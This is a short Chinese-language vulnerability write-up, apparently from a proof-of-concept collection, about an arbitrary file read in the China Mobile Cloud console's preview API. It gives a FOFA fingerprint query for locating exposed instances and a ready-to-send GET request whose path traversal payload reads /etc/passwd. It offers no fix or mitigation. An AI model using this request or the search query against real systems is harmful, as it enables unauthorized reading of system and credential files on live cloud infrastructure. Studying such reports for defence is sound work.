# 中国移动云控制台preview存在任意文件读取

# 一、漏洞简介
中国移动云控制台是一套用于统一查看和管理移动云产品及服务的系统，移动云控制台存在文件任意下载漏洞，攻击者可利用此漏洞获取任意文件信息。

# 二、影响版本
+ 中国移动云控制台

# 三、资产测绘
+ fofa`body="op-login-static/favicon.ico" || header="/oauth2/code/opgateway"`
+ 特征

![1717665626881-f95bf7e9-e0e5-418a-bccf-45b67fa9ea2f.png](./img/dwA7UL8Kn96zuHeq/1717665626881-f95bf7e9-e0e5-418a-bccf-45b67fa9ea2f-740575.png)

# 四、漏洞复现
```java
GET /api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```

![1717665679298-f02a0afd-8a0e-4cde-b779-7cb99b10ce9c.png](./img/dwA7UL8Kn96zuHeq/1717665679298-f02a0afd-8a0e-4cde-b779-7cb99b10ce9c-230957.png)



> 更新: 2024-06-11 10:30:33  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sh18y2kvdy1ou9gn>